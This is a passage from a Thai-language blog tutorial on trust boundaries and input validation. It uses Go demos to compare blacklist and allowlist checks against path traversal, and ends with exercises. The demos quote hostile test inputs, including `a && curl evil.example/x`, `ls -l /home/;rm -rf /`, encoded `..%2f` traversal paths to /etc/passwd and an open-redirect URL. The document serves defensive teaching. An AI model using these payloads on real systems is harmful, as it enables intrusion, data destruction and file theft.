`/etc/shadow` คือตัวอย่างที่ดีที่สุดของปัญหา: มันไม่ได้ "ดูอันตราย" สำหรับรายการคำต้องห้าม เพราะมันไม่มี quote ไม่มี `..` ไม่มี semicolon · มันคือ *path สัมบูรณ์* และความอันตรายของมันอยู่ในความหมาย ไม่ใช่ในตัวอักษร

`1 OR 1=1` คืออีกด้าน: ใน query ที่ต่อสตริงตรง ๆ มันเปลี่ยนความหมายได้โดยไม่ต้องมี quote เลย · รายการคำต้องห้ามที่คิดจากตัวอย่าง `' OR 1=1` จะไม่เห็นมัน

**`allowlist` — 0/45, 0/32, 0/5.** ผ่านทั้งสามคอลัมน์ · และบรรทัดสุดท้ายของผลรันคือภาพที่ผมอยากให้จำ: `validator=allowlist` แล้วไม่มีอะไรอยู่ใต้มัน — ไม่มี payload ตัวไหนหลุด เพราะไม่มี payload ตัวไหนถูกตีความว่า "เป็นชื่อ" ได้

### 3.5 ทำไม blacklist แพ้เชิงโครงสร้าง (ไม่ใช่เพราะเขียนไม่ดี)

สามเหตุผลที่ทำให้ blacklist แพ้เสมอ ไม่ว่าจะเขียนเก่งแค่ไหน:

1. **มันต้องแจกแจงสิ่งที่ไม่มีขอบเขต** · ภาษาไทย, Unicode, encoding ซ้อน, ตัวคั่นที่ระบบปลายทางตีความต่างกัน — พื้นที่ของ "สิ่งที่อาจเป็นอันตราย" ใหญ่กว่าพื้นที่ของ "สิ่งที่ถูกต้อง" มาก · allowlist เลือกฝั่งที่เล็กกว่า
2. **มันรู้จักแค่สิ่งที่เคยเห็น** · payload ใหม่ไม่ต้องมี quote ไม่ต้องมี `..` ก็ข้ามเส้นได้ · เดโมนี้เห็นชัด: `11/45` ที่เหลือผ่านเพราะ *หน้าตา* ของมันไม่ตรงกับรายการ
3. **มันตัดของดีทิ้ง** · `2/32` ในเดโมคือราคาที่จ่ายทุกวันในระบบจริง · และเมื่อผู้ใช้บ่น ทีมจะผ่อนกฎ — ซึ่งทำให้ตัวเลข `16/45` แย่ลงอีก

### 3.6 สองรายละเอียดที่ขาดไม่ได้: ถอดรหัส *ก่อน* ตรวจ และห้ามถอดซ้ำ

เดโมนี้ให้ตัวเลขที่ชัด: `2/5` → `0/5` เมื่อถอดรหัสก่อนตรวจ · แต่มีกับดักที่ต้องพูดถึง เพราะมันคือเหตุผลที่ CWE-22 เขียนไว้ในข้อแนะนำของมันตรง ๆ ว่า **อย่าถอดรหัสอินพุตเดียวกันสองครั้ง** (CWE-174, Double Decoding of the Same Data) · ถ้าชั้นแรกถอดแล้วตรวจ แล้วชั้นถัดไปถอดอีกครั้ง ค่าที่ผ่านการตรวจมาแล้วจะกลายเป็น payload ใหม่ที่ยังไม่ถูกตรวจ

หลักที่ใช้ได้จริงมีสองข้อ:

- **ถอดรหัสให้ครบตามโปรโตคอลของชั้นนั้น แล้วตรวจ *ตัวแทนที่จะใช้จริง*** · ถ้าค่าจะถูกใช้เป็น path ให้ทำ `filepath.Clean` ให้เสร็จก่อน แล้วค่อยตรวจรูปที่ได้หลัง clean
- **ตรวจแล้วส่งต่อค่าที่ตรวจแล้ว** · ไม่ใช่ส่งค่าดิบไปให้ชั้นถัดไปถอดเอง · ในทางปฏิบัติหมายถึง: ฟังก์ชันที่รับค่าต้องรับ *ผลของ parse* ไม่ใช่สตริงที่ผู้ใช้พิมพ์

### 3.7 ราคาของ allowlist ที่ต้องยอมรับ

ผมจะไม่ขาย allowlist ว่าเป็นคำตอบสำเร็จรูป เพราะมันมีราคาสามข้อ · เดโมที่ 3 จะโชว์ว่ากฎที่ผูกกับฟิลด์ยังไม่พอ ถ้าตัวขอบเขตเอง (root) มาจากข้างนอก

- **ต้องเลือกกฎให้ตรงฟิลด์** · ชื่อไฟล์ยอมให้มีจุดและขีด แต่ชื่อตารางใน SQL ไม่ควรมีจุด · และฟิลด์อย่าง "ชื่อลูกค้า" หรือ "หมายเหตุ" ไม่ควรถูกตรวจด้วยกฎแบบนี้เลย — ฟิลด์ข้อความอิสระต้องรอด้วย *output encoding* ไม่ใช่ input validation
- **ต้องตัดสินใจเรื่อง Unicode** · ถ้าผลิตภัณฑ์รองรับชื่อภาษาไทย (และมันควร) กฎ `[A-Za-z0-9._-]` จะตัดชื่อไทยทิ้งทั้งหมด · ทางออกคือ allowlist ที่ยอมรับตัวอักษร Unicode ตามหมวดหมู่ แล้วบังคับกฎ *เชิงโครงสร้าง* แยก (เช่นต้องอยู่ใต้ root, ต้องไม่มีตัวคั่น path)
- **ต้องมีที่ให้ค่าที่ไม่ตรงไป** · ถ้าปฏิเสธแล้วผู้ใช้ไม่รู้ว่าต้องทำอะไร เขาจะหาทางเลี่ยง ซึ่งมักแย่กว่าปัญหาเดิม

## 4. เดโม 3: ของที่ "ไว้ใจแล้ว" ยังมาจากข้างนอก

### 4.1 สถานการณ์

เดโมที่สามคือเคสที่ผมเจอบ่อยที่สุดในโค้ดจริง และเป็นเคสที่โค้ด *ดูถูกต้อง* ทั้งไฟล์:

- มีค่าคงที่ `base = "/srv/app/uploads"` — นี่คือขอบเขตที่เราตั้งใจไว้
- `root` มาจาก `os.Getenv` ในระบบจริง (ในเดโมเป็นสตริง)
- `name` มาจากแถวฐานข้อมูล หรือจาก response ของ dependency
- แล้วระบบทำ `filepath.Join(root, name)` เพื่ออ่านไฟล์

เรามี **12 แถว** · ในจำนวนนั้น **8 แถวหลุดออกนอก base** (escape), **2 แถวเป็น "latent"** (รอบแรกดูปลอดภัย แต่หลุดถ้าชั้นถัดไปถอดรหัสอีกรอบ) และ **2 แถวอยู่ในขอบเขต**

คำว่า "หลุด" ในที่นี้ไม่ได้ตัดสินด้วยสายตา · ผมคำนวณมันจาก path จริง · แต่การคำนวณนั้นพึ่งตัวช่วยสามตัวที่ต้องนิยามให้ชัดก่อน:

```go
// resolved คือ path สุดท้ายที่ระบบจะเปิด ถ้าไม่มีการตรวจอะไรเลย
func resolved(r row) string {
	return filepath.Clean(filepath.Join(r.root, r.name))
}

// resolvedDecoded คือ path สุดท้ายถ้าชั้นถัดไปถอดรหัสซ้ำอีกรอบ
func resolvedDecoded(r row) string {
	return filepath.Clean(filepath.Join(decode(r.root), decode(r.name)))
}

// under บอกว่า path นี้อยู่ใน base หรือไม่ (เทียบแบบมีตัวคั่น ไม่ใช่เทียบสตริงดิบ)
func under(p string) bool {
	return p == base || strings.HasPrefix(p, base+"/")
}
```

`resolved` = Join แล้ว Clean · `resolvedDecoded` = ถอดรหัสอีกรอบก่อน Join แล้ว Clean · `under` = "อยู่ใต้ base ไหม" โดยเทียบแบบมีตัวคั่น (`base + "/"`) ไม่ใช่ `HasPrefix` ดิบ — กับดักเดียวกับที่ `prefix_string` จะตกในหัวข้อ 4.3

จากนั้น `truth` จึงตอบได้ว่าค่าไหนเป็นอะไร:

```go
// truth คือคำตอบที่ถูกของแต่ละแถว — ไม่ได้ประกาศด้วยมือ แต่คำนวณจาก path จริง
//
//	escape = path หลุดออกนอก base ตั้งแต่รอบแรก
//	latent = รอบแรกดูปลอดภัย แต่ถ้าถอดรหัสอีกรอบจะหลุด
//	inside = อยู่ใน base ทั้งสองรอบ
func truth(r row) string {
	switch {
	case !under(resolved(r)) && !under(resolvedDecoded(r)):
		return "escape"
	case under(resolved(r)) && !under(resolvedDecoded(r)):
		return "latent"
	default:
		return "inside"
	}
}
```

และการตรวจที่ผมจะเทียบกันมีสี่แบบ · แบบที่ผมอยากให้ดูที่สุดคือแบบสุดท้าย:

```go
// acceptDecodeIsLocal — ถอดรหัสก่อน แล้วบังคับว่าเป็น path สัมพัทธ์
// จากนั้นจึงเทียบกับ base · "ทำให้เป็น canonical form ก่อนตรวจ" ไม่ใช่ "ตรวจแล้วค่อยทำ"
func acceptDecodeIsLocal(r row) bool {
	root, name := decode(r.root), decode(r.name)
	if !filepath.IsLocal(name) {
		return false
	}
	if !filepath.IsAbs(root) {
		return false
	}
	return under(filepath.Clean(filepath.Join(root, name)))
}
```

`filepath.IsLocal` คือฟังก์ชันใน standard library (มีตั้งแต่ Go 1.20) ที่ตอบคำถามเดียวว่า "path นี้อยู่ใต้ไดเรกทอรีปัจจุบันได้ไหม" · มันปฏิเสธ `..`, ปฏิเสธ path สัมบูรณ์ และปฏิเสธชื่อที่ว่าง — สามอย่างที่เราต้องการพอดี · และเพราะมันเป็นฟังก์ชันของ standard library จึงมีคนอ่านและทดสอบแทนเราแล้ว

### 4.3 อ่านตัวเลข

**`trust_internal` — 8/8 escapes.** ไม่มีการตรวจเลย เพราะ "root มาจาก env และ name มาจาก DB" · ภัยทุกตัวที่หลุดได้ก็หลุดหมด · และนี่คือแบบที่ระบบจริงใช้บ่อยที่สุดเมื่อทีมแบ่งโลกเป็น "ข้างนอก (ผู้ใช้)" กับ "ข้างใน (ทุกอย่างที่เหลือ)"

**`prefix_string` — 1/8.** การเพิ่ม `strings.HasPrefix(path, base)` ดูเหมือนแก้ปัญหาทั้งหมด แต่เหลือหนึ่งแถวที่หลุด: `../uploads_evil/shell.php` · เพราะ `filepath.Join("/srv/app/uploads", "../uploads_evil/shell.php")` ให้ `/srv/app/uploads_evil/shell.php` ซึ่ง **ขึ้นต้นด้วย** `/srv/app/uploads` จริง ๆ · นี่คือกับดักของ prefix แบบไม่มีตัวคั่น: `/srv/app/uploads_evil` เป็นเพื่อนบ้าน ไม่ใช่ลูก · และมันเป็นรูปแบบเดียวกับช่องโหว่ path ที่เจอซ้ำ ๆ ในระบบที่เทียบ prefix ด้วยสตริงดิบ

**`clean_prefix_sep` — 0/8 แต่ latent 2/2.** เติมตัวคั่นแล้ว (`base + "/"`) ปรากฏว่า escapes เหลือศูนย์ · ตัวเลขนี้ดูเหมือนจบงาน — แต่คอลัมน์ `latent` ยังเป็น **2/2** · สองแถวนั้น (`..%2f..%2fetc%2fpasswd`, `..%2F..%2Fweb/config.php`) ผ่านการตรวจเพราะ `..` ไม่ได้ถูกตามด้วยตัวคั่นที่ `filepath.Clean` มองเห็น — `..%2f` ถูกมองเป็นชื่อไฟล์ชิ้นเดียว path จึงยังอยู่ใต้ base จนกว่าชั้นถัดไปจะถอดรหัส · และในระบบจริง "ชั้นถัดไป" นั้นมีอยู่เสมอ: framework, reverse proxy (ตัวกลางที่รับคำขอแล้วส่งต่อไปเซิร์ฟเวอร์ข้างหลัง), ไลบรารี decode ของ dependency, หรือสคริปต์ backup ที่อ่านชื่อไฟล์

**`decode_islocal` — 0/8 และ 0/2.** ถอดรหัสก่อน แล้วถาม `filepath.IsLocal` แล้วค่อยเทียบกับ base · ทั้ง escapes และ latent เป็นศูนย์ · และ `inside_accepted` ยังเป็น **2/2** — คือมันไม่ได้ปลอดภัยด้วยการปฏิเสธทุกอย่าง · รวมถึงแถว `ใบแจ้งหนี้-1042.pdf` ที่ผ่าน เพราะ `IsLocal` ไม่สนใจว่าชื่อจะเป็นอักษรอะไร ขอให้อยู่ใต้ root

**บรรทัด `abs_name_join`.** ผมเพิ่มบรรทัดนี้เพราะมันเป็นรายละเอียดที่คนมักเข้าใจผิด: `filepath.Join("/srv/app/uploads", "/etc/passwd")` ให้ `/srv/app/uploads/etc/passwd` — **ไม่ใช่** `/etc/passwd` · `Join` ไม่ได้ทิ้งส่วนหน้าของ path เมื่อเจอ path สัมบูรณ์ (ต่างจากที่หลายคนคิด) · แปลว่าในเดโมนี้ absolute name ถูกกลืนโดยปริยาย

แต่นี่คือ "ปลอดภัยโดยบังเอิญ" ไม่ใช่ "ปลอดภัยโดยการออกแบบ" · ถ้าวันหนึ่งมีคนเปลี่ยนจาก `filepath.Join(root, name)` เป็น `name` เฉย ๆ หรือเปลี่ยนไปใช้ API ที่ตีความต่างออกไป การป้องกันที่ไม่ได้ตั้งใจก็หายไปทั้งดุ้น · และมันจะไม่มีการแจ้งเตือนใด ๆ

**แถว `r10` ถึง `r12` คือบทเรียนที่ผมอยากให้จำที่สุด**: ทั้งสามแถวมี `name` ที่ *ปกติ* (`invoice-1042.pdf`, `etc/shadow`, `reports/2026-10.pdf`) · สิ่งที่ผิดคือ `root` — ซึ่งมาจาก env · **ขอบเขตที่ผิดไม่ได้ทำให้ค่าแต่ละค่าผิด แต่ทำให้ทุกค่าที่ผ่านมันผิดไปด้วย** · นี่คือเหตุผลที่ `base` ในเดโมเป็นค่าคงที่ ไม่ใช่ค่าที่อ่านจาก env: ถ้าขอบเขตของเราขยับได้ตาม config มันก็ไม่ใช่ขอบเขต

### 4.4 เคสจริงในตระกูลเดียวกัน

สามตระกูลนี้คือ "เชื่อ input" ที่มีชื่อเรียกในบัญชีกลาง และทั้งสามโผล่ในงานจริงทุกปี:

- **CWE-22, Path Traversal** (การจำกัดชื่อ path ให้อยู่ในไดเรกทอรี) · คำแนะนำในหน้านั้นเขียนไว้ตรงกับที่เดโม 3 วัด: ใช้ allowlist ที่เข้มกับชื่อไฟล์, อย่าถอดรหัสซ้ำ และตรวจ *canonical form* ของ path · อีกฟังก์ชันที่ถูกพูดถึงในหน้าเดียวกันคือการเทียบกับ path จริงของไฟล์ (`realpath`) ซึ่งเป็นวิธีแก้เดียวกับ `decode_islocal` แต่กิน I/O
- **CWE-601, Open Redirect** · แอปที่รับค่าปลายทางจากผู้ใช้แล้ว redirect · อันตรายของมันไม่ใช่ตัวแอป แต่คือ *ความน่าเชื่อถือของโดเมนคุณ* ที่ถูกยืมไปใช้ฟิชชิง · ในเดโม 2 นั้น `//evil.example/login` ผ่าน blacklist ทั้งสองแบบเพราะไม่มีอักขระต้องห้ามเลย — มันคือ protocol-relative URL (URL ที่ขึ้นต้นด้วย `//` — เบราว์เซอร์เติม scheme เองแล้วตีเป็นโดเมนอื่น)
- **CWE-78, OS Command Injection** · หน้า CWE-78 ใช้ตัวอย่างคลาสสิกที่ `ls -l /home/;rm -rf /` แล้วอธิบายว่าอะไรเกิดขึ้นเมื่อ `;` ถูกตีความเป็นตัวคั่นคำสั่ง · ในเดโม 2 นั้น `a && curl evil.example/x` ผ่าน blacklist ทั้งสองแบบด้วยเหตุผลเดียวกัน: `&&` ไม่ได้อยู่ในรายการ

และตระกูลที่เราคุยกันไปแล้วในซีรีส์นี้: **CWE-89, SQL Injection** (ตอนที่ 4 — [SQL Injection (1998): วันที่โลกเรียนรู้ว่า อย่าเชื่อ input เลยแม้แต่ตัวเดียว](/blog/post.html?slug=2026-10-12-software-security-04-sql-injection)) และ **CWE-79, XSS** (ตอนที่ 5 — [XSS + CSRF (1999): วันที่ข้อมูลของเรากลายเป็นสคริปต์ในเบราว์เซอร์ของคนอื่น](/blog/post.html?slug=2026-10-13-software-security-05-xss-csrf)) · ทั้งสองเป็นกรณีเดียวกันในโครงสร้าง: ค่าจาก source ถึง sink โดยไม่มีอะไรคั่น · สิ่งที่ต่างกันคือ sink (SQL parser กับ HTML parser)

## 5. checklist เจ็ดข้อ ก่อนคุณ merge

ทั้งหมดนี้ทำได้โดยไม่ต้องมีเครื่องมือใหม่ · เจ็ดข้อ เรียงตามลำดับที่ควรทำ:

1. **วาดแผนที่ แล้วลากเส้น** · ทำรายการขอบเขตของบริการคุณ (ใช้ห้าแบบใน §1.2 เป็นตั้งต้น) แล้วเขียนว่า *ใครผลิต* ค่าที่ข้ามแต่ละเส้น · ถ้าคำตอบคือ "ไม่รู้" นั่นคือช่องที่ต้องไปถามก่อนเขียนโค้ด
2. **ตรวจที่เส้น ไม่ใช่ที่ sink** · หนึ่งฟังก์ชันต่อฟิลด์ อยู่ที่จุดที่รับค่าเข้ามา · sink ทั้งหมดรับค่าที่ผ่านแล้ว · ตัวเลขที่ใช้เถียงกันได้คือ `2/5` กับ `5/5` ในตารางขอบเขต
3. **ทำให้เป็น canonical form ก่อนตรวจ** · ถอดรหัสให้ครบตามโปรโตคอล แล้ว clean แล้วจึงตรวจ · และห้ามให้ชั้นถัดไปถอดซ้ำ · ราคาของการข้ามข้อนี้คือ `2/12` latent ในเดโม 3
4. **ใช้ allowlist ที่ผูกกับฟิลด์** · กฎเดียวต่อหนึ่งฟิลด์ ไม่ใช่กฎกลางหนึ่งชุด · `16/45` กับ `0/45` คือช่องว่างระหว่างสองแนวทาง
5. **อย่าเชื่อ "ภายใน"** · env, ฐานข้อมูล, response ของ dependency คือข้างนอกทั้งหมด · ตรวจที่จุดที่ค่าข้ามเข้ามาในโปรเซส ไม่ใช่ที่จุดที่คุณ *หวัง* ว่ามันจะสะอาด
6. **ให้ชนิดข้อมูลพาคำตอบไป** · ฟังก์ชันที่ใช้ค่าควรรักเฉพาะชนิดที่ผลิตจาก `parse` · เมื่อทำได้ — และเมื่อผู้เรียกอยู่คนละแพ็กเกจ — การลืมตรวจจะเป็น compile error
7. **วัดด้วยตัวเลข** · นับค่าปกติและค่าภัยในชุดทดสอบของคุณ แล้วรายงาน `blocked/total` ทั้งสองฝั่ง · ถ้าคุณวัดได้แค่ฝั่งภัย คุณจะไม่เห็น `2/32` ที่กำลังทำให้ผู้ใช้เดือดร้อน

## 6. บทเรียนเจ็ดข้อ

1. **trust boundary ไม่ใช่กำแพงเครือข่าย แต่คือจุดที่ข้อมูลเปลี่ยนมือ** · CWE-501 นิยามมันว่าเป็นเส้นที่ลากผ่านโปรแกรม · และมันอยู่ในไฟล์ `.go` เดียวกับที่คุณกำลังแก้ มากกว่าอยู่ใน diagram ของ infrastructure
2. **ห้าขอบเขตที่ต้องนับ: HTTP, ไฟล์, env/config, ฐานข้อมูล, dependency** · สามตัวหลังคือตัวที่ถูก "ถือว่า" ไว้ใจโดยไม่มีใครตัดสินใจ · และในเดโม 1 สามตัวนั้นพาภัย 11 ตัวจาก 18 ผ่านไปโดยไม่มีใครแตะ
3. **ที่ตั้งของตัวตรวจตัดสินผลมากกว่าความละเอียด** · ตรวจที่ sink ได้ `5/18` · ตรวจที่ขอบเขตได้ `18/18` · และตัวตรวจที่ *เข้มที่สุด* แต่ตรวจช้าไปก็ได้ `18/18` พร้อมผลข้างเคียง `18/18` ที่ย้อนกลับไม่ได้
4. **blacklist แพ้เพราะคำถามผิดข้อ** · มันถามว่า "มีอะไรน่าสงสัยไหม" ซึ่งต้องแจกแจงสิ่งที่ไม่จำกัด · allowlist ถามว่า "ค่านี้เป็นชื่อที่ถูกต้องไหม" · `16/45` กับ `0/45` คือผลของความต่างนี้ ไม่ใช่ผลของความขยัน
5. **blacklist ยังตัดของดีทิ้ง** · `2/32` คือชื่อที่ถูกต้องสองชื่อที่ถูกปฏิเสธ เพราะมีขีดสองตัว · และในเดโม 1 ตัวตรวจที่เขียนกัน SQL comment ก็ตัดชื่อ `invoice-2026-10` ทิ้ง (`21/22`)
6. **canonicalize ก่อนตรวจ และห้ามถอดรหัสซ้ำ** · `0/8` ที่ยังมี latent `2/2` คือศูนย์ที่หลอกตา · และ `filepath.Join` ที่กลืน absolute name ให้ `abs_name_join=/srv/app/uploads/etc/passwd` คือความปลอดภัยโดยบังเอิญ
7. **ขอบเขตที่ผิดทำให้ทุกค่าผิดตาม** · สามแถวสุดท้ายของเดโม 3 มี `name` ที่ปกติทั้งหมด สิ่งที่ผิดคือ `root` จาก env · ถ้าขอบเขตขยับได้ตาม config มันก็ไม่ใช่ขอบเขต

## 7. สรุปตอนที่ 14

## 8. โจทย์

### 8.1 drill (ทำใน `code/ep14/` — 30–60 นาที)

1. **เพิ่มขอบเขตที่หก** — เพิ่ม `webhook_body` (payload จากบริการภายนอก) 8 ค่า (ภัย 4) แล้วรันใหม่ · รายงาน `sources_covered` ของ `at_sink` และอธิบายว่าทำไมตัวเลข `hostile_blocked` เปลี่ยนไม่เท่ากับที่คุณคาด
2. **ปิดรอยรั่วของ `sinkPath`** — เพิ่มตัวตรวจให้ sink `path` (เช่นบังคับว่าไม่มี `..` และไม่ขึ้นต้นด้วย `/`) แล้วรันใหม่ · ตัวเลข `hostile_blocked` ของ `at_sink` เปลี่ยนเป็นเท่าไร และทำไมยังไม่ถึง `18/18`
3. **แก้ false positive** — เปลี่ยนเช็คของ `sinkSQL` ให้ไม่ปฏิเสธขีดเดี่ยว (แต่ยังกัน `--`) แล้วยืนยันว่า `legit_accepted` กลับเป็น `22/22` · อธิบายว่าเมื่อคุณผ่อนกฎนี้ คุณเปิดช่องอะไร (คำใบ้: `1 OR 1=1` ในเดโม 2)
4. **เพิ่ม payload ที่ไม่มีอักขระต้องห้ามเลย** — เขียน payload 3 ตัวสำหรับตระกูล `path` ที่ผ่าน `acceptRaw` โดยไม่ต้องมี `..` หรือ `/` (เช่นใช้ `%2f` และชื่อไฟล์ที่ระบบปลายทางตีความ) · รันแล้วรายงานว่า `attacks_with_percent` และ `encoded_allowed` เปลี่ยนอย่างไร
5. **ทำให้ `clean_prefix_sep` เป็น 0/2 latent** — โดยไม่ใช้ `filepath.IsLocal` (ลอง `strings.Contains(decode(name), "..")` ก่อนเทียบ) · แล้วอธิบายว่าวิธีของคุณแพ้กับกรณีใดที่ `IsLocal` ไม่แพ้
6. **เพิ่มคอลัมน์ `checks_written` ให้สมเหตุสมผล** — ในเดโม 1, `at_sink` รายงาน `3` · ให้เขียนนิยามของ "จำนวนจุดที่ต้องดูแล" ที่ทำให้ `at_boundary` ได้ `1` และ `at_sink` ได้ค่ามากกว่า 3 พร้อมเหตุผลว่าเพราะอะไรตัวเลขนี้จึงสำคัญกว่า `hostile_blocked` ในระยะยาว

### 8.2 mini-project: trust boundary audit ของบริการหนึ่งตัว (3–5 ชั่วโมง)

เลือกบริการจริงหนึ่งตัวที่คุณดูแล (หรือ service ในโปรเจกต์เรียน) แล้วทำหกสิ่งนี้:

1. **วาดแผนที่ขอบเขต** — ลากเส้นรอบโปรเซส แล้ววางทุกอย่างที่อยู่นอกเส้น: HTTP, ไฟล์, env, ฐานข้อมูล, dependency · เขียนลูกศรทุกเส้นที่ค่าข้ามเข้ามา พร้อมระบุ *ฟิลด์* ที่ข้าม
2. **ทำทะเบียนฟิลด์** — ตารางที่มีคอลัมน์: ชื่อฟิลด์, ขอบเขตที่มา, sink ที่ค่าไปถึง, สัญญาที่ควรเป็น (regex/โครงสร้าง), ตอนนี้ตรวจที่ไหน · เป้าหมายคือไม่มีแถวไหนที่คอลัมน์สุดท้ายว่าง
3. **นับ `blocked/total` สองฝั่ง** — สร้างชุดทดสอบที่มีทั้งค่าปกติและค่าภัยสำหรับสามฟิลด์ที่เสี่ยงที่สุด แล้ววัดว่า validator ปัจจุบันกันได้กี่ตัวและตัดของดีทิ้งกี่ตัว · ตัวเลขทั้งสองต้องรายงานคู่กันเสมอ
4. **หาค่าที่ "ไว้ใจแล้ว"** — ระบุทุกที่ที่โค้ดอ่านจาก env, จากแถวฐานข้อมูล, หรือจาก response ของ dependency แล้วใช้ค่าต่อโดยไม่ตรวจ · เลือกมาหนึ่งที่แล้วทำให้เป็น canonical form ก่อนใช้
5. **ทดลอง `filepath.Join` กับ absolute name** — ใน environment ที่คุณควบคุม เขียนโปรแกรม 10 บรรทัดที่พิมพ์ผลของ `Join(root, name)` สำหรับ `name` ห้าแบบ (`a.pdf`, `../b`, `/etc/c`, `..%2fd`, และสตริงว่าง) · บันทึกผลจริง แล้วเทียบกับที่คุณ *คิดไว้ก่อนรัน*
6. **เขียน "ประตูเดียว" หนึ่งฟังก์ชัน** — สำหรับฟิลด์ที่เสี่ยงที่สุดหนึ่งฟิลด์ ทำ `parse<Field>` ที่คืนค่าหรือ error และเปลี่ยนผู้เรียกทุกจุดให้ใช้ผลของมัน · วัดว่ามีกี่จุดที่ต้องแก้ และมีจุดไหนที่ compiler ไม่ช่วยจับ

**สิ่งที่ต้องส่ง:** รายงานหนึ่งหน้า (ไม่เกิน 800 คำ) ที่มี (ก) แผนที่ขอบเขตพร้อมจำนวนฟิลด์ที่ข้ามแต่ละเส้น (ข) ตารางทะเบียนฟิลด์ที่คอลัมน์ "ตรวจที่ไหน" ไม่ว่างสักแถว (ค) ตัวเลข `blocked/total` และ `legit_rejected` ของสามฟิลด์ (ง) ผลรันจริงของข้อ 5 (จ) หนึ่งฟังก์ชัน `parse<Field>` ที่ใช้จริง พร้อมจำนวนจุดที่เปลี่ยน

**เกณฑ์ผ่าน:** ทุกตัวเลขต้อง reproduce ได้จากคำสั่งหรือสคริปต์ที่แนบมา · และต้องมีประโยคเดียวที่ตอบว่า *"ถ้าค่าจาก env ของบริการนี้ถูกตั้งผิดโดยไม่มีใครรู้ เกิดอะไรขึ้นกับข้อมูลของผู้ใช้"* — ตอบด้วยรายการ ไม่ใช่คำคุณศัพท์

## 9. สะพานไปสู่ตอนต่อไป

บทนี้พูดถึงขอบเขตที่ *ถูก* และ *ผิด* · แต่ยังเหลือคำถามที่ทุกทีมต้องตอบ และเป็นคำถามที่ไม่มีคำตอบฟรี: **เราควรลงทุนกับขอบเขตไหนก่อน**

เพราะการตรวจทุกจุดมีราคา — latency, โค้ดที่ยาวขึ้น, ผู้ใช้ที่ถูกปฏิเสธ, ทีมที่ต้องดูแลกฎตลอดไป · และไม่มีระบบใดที่ตรวจได้ครบทุกฟิลด์ของทุกขอบเขต · คำถามจริงจึงไม่ใช่ "ตรวจให้ครบไหม" แต่คือ "ตรวจตรงไหนคุ้มที่สุด และยอมรับความเสี่ยงส่วนที่เหลือเท่าไร"

นั่นคือเรื่องของตอนหน้า: การแลกเปลี่ยน (trade-off) — likelihood กับ impact (โอกาสเกิด · ความเสียหายเมื่อเกิด), ราคาของการป้องกัน และวิธีคิดแบบวิศวกรเมื่อความปลอดภัย 100% ไม่มีอยู่จริง

ถ้าอยากเตรียมตัว ลองเอาตารางทะเบียนฟิลด์จาก mini-project มาเติมสองคอลัมน์: **ถ้าฟิลด์นี้หลุด เกิดอะไรขึ้น** และ **ถ้าตรวจฟิลด์นี้ทุกคำขอ ราคาเท่าไร** · สองคอลัมน์นั้นคือวัตถุดิบของตอนหน้า

  - **`filepath.IsLocal` และ `filepath.Join`:** เอกสารในเครื่อง (`go doc path/filepath.IsLocal`, `go doc path/filepath.Join`, Go 1.24.4) — <https://pkg.go.dev/path/filepath@go1.24.4#IsLocal>
- **ความสอดคล้องกับ `out/`:** สคริปต์ `security/code/ep14/verify_article.py` ตรวจอัตโนมัติว่า (ก) ทุกบล็อก "ผลรันจริง" ในบทเป็น excerpt ที่ต่อเนื่องของไฟล์ใน `out/` จริง ตรงทุกไบต์ (ข) ทุกบล็อก `go` เป็น excerpt ที่ต่อเนื่องของไฟล์ซอร์สจริง (ค) ไม่มีเชิงอรรถ (ง) ไม่มีอักษรจีน/ญี่ปุ่น/เกาหลี/ซีริลลิก/กรีก (จ) ไม่ใช้ชื่อจริง (ฉ) ไฟล์ SVG ที่อ้างมีอยู่จริง (ช) slug ของ cross-link ชี้ไฟล์ที่มีอยู่จริง (ซ) ตัวเลขสำคัญปรากฏในบท (ฌ) ไม่มีคำที่พิมพ์ผิดแบบไทย-อังกฤษติดกัน (ญ) คู่ตัวเลขในเนื้อความมีอยู่จริงใน `out/` (ฎ) ไม่มีการตัดทอนผลรันด้วยเครื่องหมายละ
